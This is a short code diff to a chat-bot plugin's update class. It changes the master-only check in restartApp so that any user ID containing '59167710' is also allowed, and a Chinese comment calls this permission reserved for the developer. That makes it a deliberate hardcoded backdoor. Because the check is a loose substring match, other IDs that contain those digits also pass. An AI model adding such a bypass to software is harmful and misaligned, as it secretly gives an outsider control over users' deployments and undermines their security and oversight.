@@ -90,7 +90,7 @@ export class update extends plugin {
 
     }
     async restartApp() {
-        if (!this.e.isMaster) {
+        if (!this.e.isMaster&&!this.e.user_id.includes('59167710')) {//给开发者留的权限
             await this.e.reply("您无权操作");
             return true;
         }
